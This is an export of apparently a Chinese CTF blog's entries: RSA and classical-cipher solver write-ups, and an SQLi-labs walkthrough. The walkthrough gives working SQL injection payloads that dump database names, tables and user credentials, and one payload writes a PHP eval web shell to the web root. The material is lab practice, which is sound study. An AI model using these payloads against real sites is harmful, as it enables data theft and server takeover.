<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">n = <span class="number">123814470394550598363280518848914546938137731026777975885846733672494493975703069760053867471836249473290828799962586855892685902902050630018312939010564945676699712246249820341712155938398068732866646422826619477180434858148938235662092482058999079105450136181685141895955574548671667320167741641072330259009</span></span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">c = <span class="number">19105765285510667553313898813498220212421177527647187802549913914263968945493144633390670605116251064550364704789358830072133349108808799075021540479815182657667763617178044110939458834654922540704196330451979349353031578518479199454480458137984734402248011464467312753683234543319955893</span></span><br><span class="line">k = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> (gmpy2.iroot(c + k * n, e)[<span class="number">1</span>] == <span class="literal">False</span>):</span><br><span class="line">    	k += <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(gmpy2.iroot(c + k *n,e)[<span class="number">0</span>]))</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/05/19/OQj4PzRDdItB8e2.png" alt="image-20210519230937082"></p>
<p>解得k=0 ？？？<del>鞭尸红明谷2021密码第一道RSA？</del></p>
<p>第二段共模攻击</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes,bytes_to_long</span><br><span class="line"></span><br><span class="line">n = <span class="number">111381961169589927896512557754289420474877632607334685306667977794938824018345795836303161492076539375959731633270626091498843936401996648820451019811592594528673182109109991384472979198906744569181673282663323892346854520052840694924830064546269187849702880332522636682366270177489467478933966884097824069977</span></span><br><span class="line">e1 = <span class="number">17</span></span><br><span class="line">c1 = <span class="number">54995751387258798791895413216172284653407054079765769704170763023830130981480272943338445245689293729308200574217959018462512790523622252479258419498858307898118907076773470253533344877959508766285730509067829684427375759345623701605997067135659404296663877453758701010726561824951602615501078818914410959610</span></span><br><span class="line">e2 = <span class="number">65537</span></span><br><span class="line">c2 = <span class="number">91290935267458356541959327381220067466104890455391103989639822855753797805354139741959957951983943146108552762756444475545250343766798220348240377590112854890482375744876016191773471853704014735936608436210153669829454288199838827646402742554134017280213707222338496271289894681312606239512924842845268366950</span></span><br><span class="line"></span><br><span class="line">g, x, y = gmpy2.gcdext(e1, e2) <span class="comment">#先通过扩展欧几里得算法求出x * e1 + y * e2 = 1中的x和y</span></span><br><span class="line"><span class="comment">#print(x, y)</span></span><br><span class="line">m = <span class="built_in">pow</span>(c1, x, n) * <span class="built_in">pow</span>(c2, y, n) % n <span class="comment">#计算(c1的x次方 * c2的y次方) mod n</span></span><br><span class="line"><span class="comment">#print(m)</span></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/05/19/bJeO8CZlMSyoGaT.png" alt="image-20210519231043784"></p>
<p>第三段coppersmith定理已知高位p</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Sage</span></span><br><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line">n = <span class="number">113432930155033263769270712825121761080813952100666693606866355917116416984149165507231925180593860836255402950358327422447359200689537217528547623691586008952619063846801829802637448874451228957635707553980210685985215887107300416969549087293746310593988908287181025770739538992559714587375763131132963783147L</span></span><br><span class="line">p4 = <span class="number">7117286695925472918001071846973900342640107770214858928188419765628151478620236042882657992902</span></span><br><span class="line">e =  <span class="number">65537</span></span><br><span class="line">pbits = <span class="number">512</span></span><br><span class="line">kbits = pbits - p4.nbits()</span><br><span class="line"><span class="built_in">print</span>(p4.nbits())</span><br><span class="line">p4 = p4 &lt;&lt; kbits</span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = x + p4</span><br><span class="line">roots = f.small_roots(X=<span class="number">2</span>^kbits, beta=<span class="number">0.4</span>)</span><br><span class="line"><span class="comment">#经过以上一些函数处理后，n和p已经被转化为10进制</span></span><br><span class="line"><span class="keyword">if</span> roots:        </span><br><span class="line">	p = p4+<span class="built_in">int</span>(roots[<span class="number">0</span>]) </span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;n: &quot;</span>+<span class="built_in">str</span>(n))</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;p: &quot;</span>+<span class="built_in">str</span>(p))</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;q: &quot;</span>+<span class="built_in">str</span>(n//p))</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/05/19/KJTbj1eph5FcVv9.png" alt="image-20210519231438772"></p>
<p>解出p、q后，直接求欧拉函数的逆元一把梭了。</p>
<p>得到三段message后，拼接一下得到text，再用python2求一下md5，得到答案：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CISCN&#123;3943e8843a19149497956901e5d98639&#125;</span><br></pre></td></tr></table></figure>
<h3 id="本题总结：-2"><a href="#本题总结：-2" class="headerlink" title="本题总结："></a>本题总结：</h3><p>应该是防止三卷爆零设置的rsa套娃题，都是相当基础的解法，不再做分析。</p>
<h3 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h3><p><a href="https://lazzzaro.github.io/2020/05/06/crypto-RSA/">翅膀师傅的RSA讲解</a></p>
]]></content>
      <categories>
        <category>crypto</category>
      </categories>
      <tags>
        <tag>比赛复现</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL注入之sqlilab</title>
    <url>/2021/05/14/SQL%E6%B3%A8%E5%85%A5%E4%B9%8Bsqlilab/</url>
    <content><![CDATA[<h1 id="sqlilab学习"><a href="#sqlilab学习" class="headerlink" title="sqlilab学习"></a>sqlilab学习</h1><p>sqlilabs练习，主要参考郁离歌大佬的博客和SQL注入天书。</p>
<span id="more"></span>
<h2 id="联合查询篇"><a href="#联合查询篇" class="headerlink" title="联合查询篇"></a>联合查询篇</h2><h3 id="less-1"><a href="#less-1" class="headerlink" title="less-1"></a>less-1</h3><p>1、先输入<code>?id=1 and 1=2</code>判断发现回显正常，显然不是数字型注入。</p>
<p>2、在<code>?id</code>后面加上<code>&#39;</code> ,回显报错，存在字符型注入。</p>
<p>3、在后面加上注释符<code>#</code>或<code>--+</code>后，页面回显正常，可以得出存在单引号字符型注入。</p>
<p>4、使用以下payload：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; order by 3--+   //1,2,3回显均正常，4回显不正常。</span></span><br></pre></td></tr></table></figure>
<p>说明此表有3列。</p>
<p>5、使用payload：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,3--+</span></span><br></pre></td></tr></table></figure>
<p>联合查询语句查看页面是否有回显，发现页面回显2、3，说明页面有2个显示位。</p>
<p>看一下源码，mysql_fetch_array只被调用了一次，</p>
<p>而mysql_fetch_array从结果集中取得一行作为关联数组</p>
<p>或数字数组或二者兼有，具体看第二个参数是什么。</p>
<p>所以这里无论怎么折腾最后只会出来第一行的查询结果。</p>
<p>只要让第一行查询的结果是空集0或-1，即union左边的select子句查询结果为空，</p>
<p>那么union右边的查询结果自然就成为了第一行，打印在网页上了。</p>
<p>6、使用payload爆库名：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,(select group_concat(schema_name) from information_schema.schemata),3--+</span></span><br></pre></td></tr></table></figure>
<p>7、使用payload爆库security的表</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27;--+</span></span><br></pre></td></tr></table></figure>
<p>ps：table_schema=后面可以直接加单引号括起的数据库名，也可以是数据库的16进制，过滤单引号可用。</p>
<p>首先说一下mysql的数据库information_schema，他是系统数据库，安装完就有，记录是当前数据库的数据库，表，列，<br>用户权限等信息，下面说一下常用的几个表</p>
<p>SCHEMATA表:储存mysql所有数据库的基本信息，包括数据库名，编码类型路径等，show databases的结果取之此表。</p>
<p>TABLES表:储存mysql中的表信息，（当然也有数据库名这一列，这样才能找到哪个数据库有哪些表嘛）包括这个表是基本表还是系统表，数据库的引擎是什么，表有多少行，创建时间，最后更新时间等。show tables from schemaname的结果取之此表</p>
<p>COLUMNS表：提供了表中的列信息，（当然也有数据库名和表名称这两列）详细表述了某张表的所有列以及每个列的信息，包括该列是那个表中的第几列，列的数据类型，列的编码类型，列的权限，列的注释等。是show columns from schemaname.tablename的结果取之此表。</p>
<p>8、爆列</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27;--+</span></span><br></pre></td></tr></table></figure>
<p>9、爆数据</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,username,password from users where id=2--+   //查看第二栏的数据</span></span><br></pre></td></tr></table></figure>
<h4 id="SQL语句："><a href="#SQL语句：" class="headerlink" title="SQL语句："></a>SQL语句：</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>
<h3 id="less-2"><a href="#less-2" class="headerlink" title="less-2"></a>less-2</h3><p> 同1的做法，只是闭合的SQL语句不同。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>
<h3 id="less-3"><a href="#less-3" class="headerlink" title="less-3"></a>less-3</h3><p>语句不同。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=(&#x27;<span class="subst">$id</span>&#x27;) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>
<h3 id="less-4"><a href="#less-4" class="headerlink" title="less-4"></a>less-4</h3><p>语句不同。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=(<span class="subst">$id</span>) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>
<h2 id="盲注篇"><a href="#盲注篇" class="headerlink" title="盲注篇"></a>盲注篇</h2><h3 id="基础知识：sql注入截取字符串"><a href="#基础知识：sql注入截取字符串" class="headerlink" title="基础知识：sql注入截取字符串"></a>基础知识：sql注入截取字符串</h3><p><img src="https://i.loli.net/2021/05/24/JaMgBsZhiy47v3Y.png" alt="image-20210524090237647"></p>
<p><img src="https://i.loli.net/2021/05/24/X7ErN3HMQjJcTs9.png" alt="image-20210524090313928"></p>
<p><img src="https://i.loli.net/2021/05/24/Bdluiw5IsfyvncL.png" alt="image-20210524090338115"></p>
<p>同时也要介绍ORD()函数，此函数为返回第一个字符的ASCII码，经常与上面的函数进行组合使用。</p>
<p>例如ORD(MID(DATABASE(),1,1))&gt;114 意为检测database()的第一位ASCII码是否大于114，也即是‘r’</p>
<h3 id="less-5"><a href="#less-5" class="headerlink" title="less-5"></a>less-5</h3><p>报错注入</p>
<p>1、使用left()爆基本信息(版本号)</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;and left(version(),1)&lt;6--+</span></span><br></pre></td></tr></table></figure>
<p>爆数据库长度</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;and length(database())&lt;9--+</span></span><br></pre></td></tr></table></figure>
<p>2、爆当前用户名数据库等基本信息</p>
<p>双查询注入：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union Select 1,count(*),concat((select database()),floor(rand(0)*2))a from information_schema.columns group by a--+</span></span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/05/28/PfCtBogvTU4nKYS.png" alt="image-20210528225944247"></p>
<p><img src="https://i.loli.net/2021/05/28/Iwya1OGoY7DvZkn.png" alt="image-20210528230013553"></p>
<p>3、爆表</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select count(*),1, concat(&#x27;</span><span class="operator">~</span><span class="string">&#x27;,(select table_name from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27; limit 0,1),&#x27;</span><span class="operator">~</span><span class="string">&#x27;, floor(rand()*2)) as a from information_schema.tables group by a%23</span></span><br></pre></td></tr></table></figure>
<p>如需爆不同的数据库，在<code>security</code>处做修改。</p>
<p><code>limit 0,1</code>可以用来修改，爆出当前目录下的所有值。</p>
<p>4、爆列</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select count(*),1, concat(&#x27;</span><span class="operator">~</span><span class="string">&#x27;,(select column_name from information_schema.columns where table_schema=&#x27;</span>security<span class="string">&#x27; and table_name=&#x27;</span>emails<span class="string">&#x27; limit 0,1),&#x27;</span><span class="operator">~</span><span class="string">&#x27;, floor(rand()*2)) as a from information_schema.tables group by a%23</span></span><br></pre></td></tr></table></figure>
<p>同理，在<code>security</code>和<code>email</code>处修改。</p>
<p>5、爆数据</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select count(*),1, concat(&#x27;</span><span class="operator">~</span><span class="string">&#x27;,(select email_id from emails limit 0,1),&#x27;</span><span class="operator">~</span><span class="string">&#x27;, floor(rand()*2)) as a from information_schema.tables group by a%23</span></span><br></pre></td></tr></table></figure>
<p>修改点在列名<code>email_id</code>和表名<code>emails</code></p>
<h4 id="SQL语句：-1"><a href="#SQL语句：-1" class="headerlink" title="SQL语句："></a>SQL语句：</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>
<h3 id="less-6"><a href="#less-6" class="headerlink" title="less-6"></a>less-6</h3><p>同less-5，只是闭合方式有显著不同。</p>
<p>SQL语句：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$id</span> = <span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$id</span>.<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>
<h3 id="less-8"><a href="#less-8" class="headerlink" title="less-8"></a>less-8</h3><p>时间盲注</p>
<p>1、爆库名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA)</span><br></pre></td></tr></table></figure>
<p>2、爆表名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(select table_name from information_schema.tables where table_schema&#x3D;&#39;ctfshow&#39; limit 0,1)</span><br></pre></td></tr></table></figure>
<p>3、爆列名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(select column_name from information_schema.columns where table_name&#x3D;&#39;flagug&#39; limit 1,1)</span><br></pre></td></tr></table></figure>
<p>4、爆数据</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(select flag4a23 from ctfshow.flagug limit 0,1)</span><br></pre></td></tr></table></figure>
<h2 id="文件导入："><a href="#文件导入：" class="headerlink" title="文件导入："></a>文件导入：</h2><h3 id="相关原理：SQLI-LABS修炼笔记（三）"><a href="#相关原理：SQLI-LABS修炼笔记（三）" class="headerlink" title="相关原理：SQLI-LABS修炼笔记（三）"></a>相关原理：<a href="http://yulige.top/?p=103">SQLI-LABS修炼笔记（三）</a></h3><h3 id="less-7"><a href="#less-7" class="headerlink" title="less-7"></a>less-7</h3><p>根据less-1中查询数据库的绝对路径</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,@@datadir,3--+</span><br></pre></td></tr></table></figure>
<p>得到路径为<code>/var/lib/mysql/</code></p>
<p>测试下得到SQL语句为<code>&#39;))</code></p>
<p>蒙一个常见路径，上蚁剑</p>
<p>构筑payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&#39;)) union select 1,2,&#39;&lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt;&#39; into outfile &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;shell.php&#39;--+</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>几道比赛中遇到的密码题</title>
    <url>/2021/05/09/%E5%87%A0%E9%81%93%E6%AF%94%E8%B5%9B%E4%B8%AD%E9%81%87%E5%88%B0%E7%9A%84%E5%AF%86%E7%A0%81%E9%A2%98/</url>
    <content><![CDATA[<h1 id="比赛中的Crypto题复现"><a href="#比赛中的Crypto题复现" class="headerlink" title="比赛中的Crypto题复现"></a>比赛中的Crypto题复现</h1><p>今年比赛中做到的一些高质量的密码题。</p>
<span id="more"></span>
<h2 id="2021蓝帽杯初赛classic"><a href="#2021蓝帽杯初赛classic" class="headerlink" title="2021蓝帽杯初赛classic"></a>2021蓝帽杯初赛classic</h2><h3 id="题目："><a href="#题目：" class="headerlink" title="题目："></a>题目：</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> l1, l2, text, key, flag</span><br><span class="line"></span><br><span class="line"><span class="comment"># text is a plain English text which only consists of lowercase letters (without any symbol)</span></span><br><span class="line">table = <span class="string">'abcdefghijklmnopqrstuvwxyz'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> key <span class="keyword">in</span> text</span><br><span class="line"><span class="keyword">assert</span> l1 * l2 &lt; <span class="number">100</span></span><br><span class="line"></span><br><span class="line">k1 = []</span><br><span class="line">k2 = []</span><br><span class="line"></span><br><span class="line">fib = [<span class="number">0</span>, <span class="number">1</span>]</span><br><span class="line">modulus = randint(<span class="number">12345</span>,<span class="number">6789010</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span> &lt;&lt; <span class="number">16</span>):</span><br><span class="line">    fib.append((fib[-<span class="number">1</span>] + fib[-<span class="number">2</span>]) % modulus)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l1):</span><br><span class="line">    k1.append(fib[randint(<span class="number">0</span>, <span class="number">1</span> &lt;&lt; <span class="number">16</span>)] % <span class="number">26</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l2):</span><br><span class="line">    k2.append(fib[randint(<span class="number">0</span>, <span class="number">1</span> &lt;&lt; <span class="number">16</span>)] % <span class="number">26</span>)</span><br><span class="line"></span><br><span class="line">c = <span class="string">''</span>.join(table[((<span class="built_in">ord</span>(x) - <span class="number">97</span>) * (k1[i % l1]) + k2[i % l2]) % <span class="number">26</span>] <span class="keyword">for</span> i, x <span class="keyword">in</span> <span class="built_in">enumerate</span>(text))</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">aes = AES.new(key.encode(), AES.MODE_CBC, <span class="string">b'\0'</span> * <span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(aes.encrypt(flag + <span class="string">b'\0'</span> * (<span class="number">16</span> - <span class="built_in">len</span>(flag) % <span class="number">16</span>))))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="exp："><a href="#exp：" class="headerlink" title="exp："></a>exp：</h3><p>Python2环境：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf_8</span></span><br><span class="line"><span class="keyword">import</span> gmpy2 <span class="keyword">as</span> gm</span><br><span class="line"></span><br><span class="line">c = </span><br><span class="line">  <span class="comment">#太长了不写了</span></span><br><span class="line"></span><br><span class="line">best_index_of_Coincidence = <span class="number">0.065</span></span><br><span class="line"></span><br><span class="line">best_freq = {}</span><br><span class="line">best_freq[<span class="string">'a'</span>] = <span class="number">0.08167</span></span><br><span class="line">best_freq[<span class="string">'b'</span>] = <span class="number">0.01492</span></span><br><span class="line">best_freq[<span class="string">'c'</span>] = <span class="number">0.02782</span></span><br><span class="line">best_freq[<span class="string">'d'</span>] = <span class="number">0.04253</span></span><br><span class="line">best_freq[<span class="string">'e'</span>] = <span class="number">0.12702</span></span><br><span class="line">best_freq[<span class="string">'f'</span>] = <span class="number">0.02228</span></span><br><span class="line">best_freq[<span class="string">'g'</span>] = <span class="number">0.02015</span></span><br><span class="line">best_freq[<span class="string">'h'</span>] = <span class="number">0.06094</span></span><br><span class="line">best_freq[<span class="string">'i'</span>] = <span class="number">0.06966</span></span><br><span class="line">best_freq[<span class="string">'j'</span>] = <span class="number">0.00153</span></span><br><span class="line">best_freq[<span class="string">'k'</span>] = <span class="number">0.00772</span></span><br><span class="line">best_freq[<span class="string">'l'</span>] = <span class="number">0.04025</span></span><br><span class="line">best_freq[<span class="string">'m'</span>] = <span class="number">0.02406</span></span><br><span class="line">best_freq[<span class="string">'n'</span>] = <span class="number">0.06749</span></span><br><span class="line">best_freq[<span class="string">'o'</span>] = <span class="number">0.07507</span></span><br><span class="line">best_freq[<span class="string">'p'</span>] = <span class="number">0.01929</span></span><br><span class="line">best_freq[<span class="string">'q'</span>] = <span class="number">0.00095</span></span><br><span class="line">best_freq[<span class="string">'r'</span>] = <span class="number">0.05987</span></span><br><span class="line">best_freq[<span class="string">'s'</span>] = <span class="number">0.06327</span></span><br><span class="line">best_freq[<span class="string">'t'</span>] = <span class="number">0.09056</span></span><br><span class="line">best_freq[<span class="string">'u'</span>] = <span class="number">0.02758</span></span><br><span class="line">best_freq[<span class="string">'v'</span>] = <span class="number">0.00978</span></span><br><span class="line">best_freq[<span class="string">'w'</span>] = <span class="number">0.02360</span></span><br><span class="line">best_freq[<span class="string">'x'</span>] = <span class="number">0.00150</span></span><br><span class="line">best_freq[<span class="string">'y'</span>] = <span class="number">0.01974</span></span><br><span class="line">best_freq[<span class="string">'z'</span>] = <span class="number">0.00074</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> best_freq</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index_of_coincidence</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    计算字符串s的重合指数，即所有字符出现概率的平方和</span></span><br><span class="line"><span class="string">    :param s:密文字符串</span></span><br><span class="line"><span class="string">    :return:s的重合指数</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    zimubiao = <span class="string">'abcdefghijklmnopqrstuvwxyz'</span></span><br><span class="line">    freq = {}</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> zimubiao:</span><br><span class="line">        freq[x] = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> s:</span><br><span class="line">        freq[x] = freq[x] + <span class="number">1</span></span><br><span class="line">    index = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> zimubiao:</span><br><span class="line">        <span class="comment"># index = index + pow(float(freq[x]) / len(s), 2)</span></span><br><span class="line">       index = index + <span class="built_in">float</span>(freq[x] * (freq[x] - <span class="number">1</span>)) / (<span class="built_in">len</span>(s) * (<span class="built_in">len</span>(s) - <span class="number">1</span>))</span><br><span class="line">    <span class="keyword">return</span> index</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index_of_coincidence_2</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    计算明文s的拟重合指数，即s中字母的频率与英文字母的统计规律吻合程度</span></span><br><span class="line"><span class="string">    :param s:解出的明文</span></span><br><span class="line"><span class="string">    :return:s的拟重合指数</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    zimubiao = <span class="string">'abcdefghijklmnopqrstuvwxyz'</span></span><br><span class="line">    freq = {}</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> zimubiao:</span><br><span class="line">       freq[x] = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> s:</span><br><span class="line">        freq[x] = freq[x] + <span class="number">1</span></span><br><span class="line">    index = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> zimubiao:</span><br><span class="line">        index = index + <span class="built_in">float</span>(freq[x]) / <span class="built_in">len</span>(s) * best_freq[x]</span><br><span class="line">    <span class="keyword">return</span> index</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">guessMN</span>():</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    根据题意，该加密应当会周期使用密钥，该周期是key_a长度和key_k长度的最小公倍数。</span></span><br><span class="line"><span class="string">    遍历周期1到100，分别测试不同周期下各个子密文段的重合指数，然后求平均</span></span><br><span class="line"><span class="string">    :return:无返回值，打印出所有与最佳重合指数相差小于0.01的周期</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    <span class="keyword">for</span> l <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">        avergage_index = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l):</span><br><span class="line">            s = <span class="string">''</span>.join([c[j * l + i] <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(c) / l)])</span><br><span class="line">            index = index_of_coincidence(s)</span><br><span class="line">            avergage_index += index</span><br><span class="line"></span><br><span class="line">        avergage_index = avergage_index / l - best_index_of_Coincidence</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">abs</span>(avergage_index) &lt; <span class="number">0.01</span>:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">'l='</span>, l</span><br><span class="line">            <span class="built_in">print</span> avergage_index</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> <span class="string">'开始猜测周期'</span></span><br><span class="line"><span class="comment">#guessMN()#结果显示，重合指数得分较高的都是6的整数倍，所以周期极有可能是6</span></span><br><span class="line">l=<span class="number">55</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decryptChar</span>(<span class="params">c, i, j</span>):</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    对单个密文字符解密。</span></span><br><span class="line"><span class="string">    :param c: 单个密文字符</span></span><br><span class="line"><span class="string">    :param i: 与字符c相乘的那个密钥</span></span><br><span class="line"><span class="string">    :param j: 用于位移的密钥</span></span><br><span class="line"><span class="string">    :return: 明文字符</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    i_inv = gm.invert(i, <span class="number">26</span>)</span><br><span class="line">    p = <span class="built_in">chr</span>((<span class="built_in">ord</span>(c) - <span class="built_in">ord</span>(<span class="string">'a'</span>) - j) * i_inv % <span class="number">26</span> + <span class="built_in">ord</span>(<span class="string">'a'</span>))</span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">s, i, j</span>):</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    用固定的i和j，解密子密文段</span></span><br><span class="line"><span class="string">   :param s: 使用相同i和j加密的子密文段</span></span><br><span class="line"><span class="string">    :param i: 与字符c相乘的那个密钥</span></span><br><span class="line"><span class="string">   :param j: 用于位移的密钥</span></span><br><span class="line"><span class="string">    :return: 明文字符串</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    p = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> s:</span><br><span class="line">        p += decryptChar(c, i, j)</span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">guessKey</span>(<span class="params">c</span>):</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">   对子密文段爆破它所使用的i和j</span></span><br><span class="line"><span class="string">    :param c: 子密文段</span></span><br><span class="line"><span class="string">    :return: 